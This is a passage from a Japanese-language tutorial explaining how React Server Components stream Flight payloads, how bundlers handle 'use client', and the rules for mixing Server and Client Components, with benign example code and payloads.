          b<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token string">"$"</span>
      <span class="token punctuation">}</span>
      b<span class="token punctuation">.</span>_reactRetry <span class="token operator">&amp;&amp;</span> b<span class="token punctuation">.</span><span class="token function">_reactRetry</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token punctuation">;</span>
$<span class="token constant">RC</span><span class="token punctuation">(</span><span class="token string">"B:0"</span><span class="token punctuation">,</span> <span class="token string">"S:0"</span><span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>このコードは、Promiseの解決後に新たに作成されたDOMのコンテンツを、プレースホルダーが残されていた適切な場所に挿入し、プレースホルダーとフォールバックを削除します。</p>
<p>このDOM操作コードが実行された後、DOMは以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsxx"><pre style="counter-reset: linenumber NaN" class="language-jsxx line-numbers"><code class="language-jsxx">&lt;main&gt;
  &lt;h1&gt;understandingreact.com&lt;/h1&gt;
  &lt;!--$--&gt;
  &lt;p&gt;This message was loaded after a 5 second delay!&lt;/p&gt;
  &lt;!--/$--&gt;
&lt;/main&gt;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これを順不同ストリーミングといいます。これは単に、ストリーミングされてきたコンテンツを、先に完了する他のコンポーネントより前の場所であっても、仮想DOM／DOMツリーの所定の場所に挿入することを意味します。</p>
<p>そうすることで、特定のコンポーネントの実行に時間がかかったとしても、その完了を待たずにUIを更新し、他のコンポーネントの結果を反映することができます。</p>
<p>しかし、ここまではServer Components についてしか見ていません。デベロッパーが何年も前から書いてきたコンポーネントについてはどうでしょうか。ブラウザ上で実行される関数であるClient Componentsはどうでしょうか。</p>
<p>それについて語るうえで欠かせないのが、RSCを支える縁の下の力持ちとも言えるバンドラです。</p>
<h2>バンドラとインターリービング</h2>
<p>昔から、Reactの基本的な考え方の一つとしてコンポーネントコンポジションが挙げられていました。DOMの構造を決める作業はさまざまな関数に分けて行い、各コンポーネントを親子関係によって組み合わせることができます。</p>
<p>RSCがこの基本的な考え方から大きく離れないようにするためには、Server ComponentsとClient Componentsをインターリーブ（混在させる）できなくてはいけません。<strong>Client Componentsは、Server Componentsの子になれる必要</strong>があります。これには、props（関数の引数）を渡せることも含みます。</p>
<p>実際これが何を意味するかというと、コンポーネント階層の中には、サーバー上で実行される関数と、クライアント上で実行される関数があるということです。しかし最終的には、どの関数も自らが生成するDOMコンテンツの構造と中身を計算します。</p>
<p>これを実現する役割を担うのがメタフレームワークとバンドラです。しかし、抽象化はコストを伴うことを忘れてはいけません。抽象化を利用するために特別なルールを学ばなくてはいけないことがコストであることも少なくありません。この場合、サーバーとクライアントの隔たりをある程度抽象化し、気にならないようにするには、抽象化の制限を破らないようルールに従う必要があるということです。</p>
<p>RSCのケースでは、考慮すべきインターリービングのシナリオが3つあります。ルールは、コンポーネントが実行される場所に応じて何を「インポート」できるかに関わるもので、指示やインポートを分析してまとめるバンドラとRSCがどのように連携するかに基づいています。</p>
<h3>Client Components を Server Components にインポート</h3>
<p>このインポートは可能です。それが可能であるのは理にかなっています。バンドラはインポートステートメントを見て、どのコードをバンドルに含め、どのコードがクライアントによってダウンロードされるかを判断します。</p>
<p>RSCも仮想DOMの構築に参加します。Client Componentコードがバンドルに含まれブラウザに渡されるため、ツリーに含まれるClient Componentsを参照することができます。</p>
<p>Reactコースへの登録ページにステートフルな<code class="language-text">Counter</code>を追加してみましょう。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// components/Counter.js</span>
<span class="token string">'use client'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Counter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
                Enroll
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// page.js</span>
<span class="token keyword">import</span> Counter <span class="token keyword">from</span> <span class="token string">"./components/Counter"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> DelayedMessage <span class="token keyword">from</span> <span class="token string">"./components/DelayedMessage"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Suspense <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Counter</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Suspense</span></span> <span class="token attr-name">fallback</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">DelayedMessage</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Suspense</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ファイル上部に<code class="language-text">use client</code>という指示があります。これはReactの機能ではありません。コンポーネントツリーの一部をクライアント上で実行する場合は、マーキングすることがデベロッパーの間では暗黙の了解になっています。</p>
<p>そのコンポーネントと、それにインポートされるコンポーネントが、Client Componentsとしてバンドルされます。</p>
<p>バンドラは<code class="language-text">use client</code>の指示を確認し、そのコンポーネント（およびインポートされるコンポーネント）のコードをブラウザがダウンロードするバンドルに含めます。</p>
<p><code class="language-text">Home</code> RSCおよび<code class="language-text">DelayedMessage</code> RSCはサーバー上で実行されるため、これらのコードはバンドルに含まれません。サーバーから送られるPayloadは以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
   <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Reference"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"fallback"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
       <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"Loading..."</span>
       <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
      <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
   <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Client Componentが挿入される場所に「遅延読み込み（Lazy node）」のリファレンスが新たに追加されていることに注目してください。仮想DOMの当該部分は、そのClient Componentが実行されるときに分かります。つまり、Client Componentがサーバー上でレンダリング（フレームワークが対応している場合）されるか、ブラウザ上で実行されるときです。</p>
<p>もう一つ述べておきたいのが、Server ComponentからClient Componentにpropsを渡す場合、そのpropsは<a href="https://react.dev/reference/rsc/use-server#serializable-parameters-and-return-values">Reactによってシリアライズする必要</a>があるということです。</p>
<p>すでに見てきたように、propsはネットワークを介して送信されるPayloadに含まれます。つまり、データは全て文字列として渡し、クライアントのメモリ上でオブジェクトに復元する必要があるということです。</p>
<h3>Client ComponentsへのServer Componentsのインポート</h3>
<p>このインポートは認められません。サーバー上で実行されるコンポーネントを、ブラウザ上で実行されるコンポーネントにインポートすることはできません。</p>
<p>なぜかと言うと、バンドラがクライアントに送信するのはPayloadのみであり、RSC関数は送信するべきではないからです。したがって、インポートするコードはありません。バンドラはクライアントがダウンロードできるようにコードを含めることはないため、使用できるRSCコードはありません。</p>
<p>サーバーとクライアントの両方で実行可能な共有コンポーネントをインポートすることは可能です。しかし、Client Componentに共有コンポーネントをインポートする場合、そのコードはクライアントがダウンロードできるようバンドルされます。Server Componentに共有コンポーネントをインポートする場合はバンドルされません。</p>
<p>「間違ってServer Componentをインポートした場合、バンドラはそれが間違いだと分かるのか」と疑問に思うかもしれません。</p>
<p>これは妥当な疑問です。これはセキュリティ上の問題でもあります。ダウンロードされて他人の目に触れることを想定していないコードがServer Componentに含まれる場合、間違ってClient Componentにインポートし、バンドルされてしまうことがあるかもしれません。サーバー固有の機能（データベースへの接続など）が含まれる場合、ブラウザ上で実行することはできませんが、そのまま本番環境にリリースされてしまうと、データベースのアドレスなどの機密情報が漏洩する可能性があります。</p>
<p>Next.jsは対策として、<a href="https://nextjs.org/docs/app/building-your-application/rendering/composition-patterns#keeping-server-only-code-out-of-the-client-environment">コンポーネントに「サーバーのみ（server-only）」とマーキングできるようにしています</a>。しかし、これは何かを忘れないように指に紐を結びつけておくようなものです。紐を結ぶのを忘れてしまうこともありえます。</p>
<p>他のメタフレームワークは、サーバーのコードがバンドルされ、クライアントに送信されないようにするより確実な方法を検討しています。</p>
<p>しかし、一度サーバーとクライアントの境界を抽象化してしまうと、その境界が存在すること自体忘れてしまう一定のリスクを受け入れることになります。</p>
<h3>Server Componentsを子としてClient Componentsに渡す</h3>
<p><strong>これは可能です</strong>。これは興味深い、特殊なケースです。Server Componentsを<code class="language-text">children</code> propsとしてClient Componentに渡すことはできます。これはインポートとは異なります。</p>
<p><code class="language-text">Counter</code>関数にchildrenを渡した場合、以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// components/Counter.js</span>
<span class="token string">'use client'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Counter</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> children <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
                Enroll
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token punctuation">{</span> children <span class="token punctuation">}</span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// page.js</span>
<span class="token keyword">import</span> Counter <span class="token keyword">from</span> <span class="token string">"./components/Counter"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> DelayedMessage <span class="token keyword">from</span> <span class="token string">"./components/DelayedMessage"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Suspense <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Counter</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Server Text</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Counter</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Suspense</span></span> <span class="token attr-name">fallback</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">DelayedMessage</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Suspense</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">Counter</code>関数はクライアント上で実行され、このコンポーネントに渡された子<code class="language-text">（&lt;p>Server Text&lt;/p>）</code>はサーバー上で処理されますが、問題なく機能します。</p>
<p>なぜ機能するのかと言うと、実行するServer Componentコードではなく、仮想DOMツリーの一部（コードを実行した結果）を渡しているからです。</p>
<p>Payloadは以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
   <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
       <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"Server Text"</span>
       <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Reference"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"fallback"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
       <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"Loading..."</span>
       <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
      <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
   <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Payloadの"Server Text"の部分に注目してください。すでにpropsとしてClient Componentに渡されています。Client Componentで直接PayloadにJSXを書いたのと変わりません。</p>
<h2>バンドラ：縁の下の力持ち</h2>
<p>これらは全てある重要な点を示しています。<strong>React Server Componentsは、多くの点においてバンドラ機能だということです</strong>。</p>
<p>バンドラはコードを分析し、Client　Componentsがバンドルに含まれていることを確認し、Client ComponentsへのリファレンスがPayloadに適切に含まれるようにします。</p>
<p>バンドラはReactに欠かせない存在です。Reactのコードベースを見ると、以下のようなフォルダがあります。</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">/react-server-dom-parcel
/react-server-dom-turbopack
/react-server-dom-webpack
//...and more</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>これらのフォルダの中にはFlight関連のコードが含まれており、バンドルされたコードが適切に実行されるようにします。</p>
<p>バンドラがRSCにおいて脇役的な存在であるということは、他の方法も可能だということです。メタフレームワークは、Next.jsが使用する<code class="language-text">use client</code>のアプローチを受け入れる必要はありません。例えば、<a href="https://tanstack.com/start/">TanStack Start</a>は単に「JSXを返す」（Flight形式）関数としてRSCを実装しています。</p>
<p>Reactは、FlightデータのストリーミングというAPIを提供しています。メタフレームワークはバージョンアップを行い、そのAPIを工夫して使うことができます。</p>
<h2>フックとRSC</h2>
<p>サーバー上で実行することにはメリットもありますが、制約もあります。
Reactは、各要素の構造を仮想DOMに格納するだけではなく、stateを格納します。コンポーネントに以下のように書くとします。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> <span class="token punctuation">[</span>counter<span class="token punctuation">,</span> setCounter<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>そうすると、仮想DOMにおけるコンポーネントの場所に紐づけられた連結リスト上のノードにデータが置かれます。実際には、そのstateはクライアントのブラウザのメモリ上にあるJavaScriptオブジェクトの中にあります。</p>
<p>したがって、React Server Componentsは、その性質上これらのフックを利用できません。フックを利用できる環境で実行されていないのです。</p>
<p>つまり、RSCは「非インタラクティブ」だということです。Reactにおけるインタラクティビティとは、一般的にはクライアント側のReactによる再レンダリングを、stateの更新によってトリガーすることを意味します。</p>
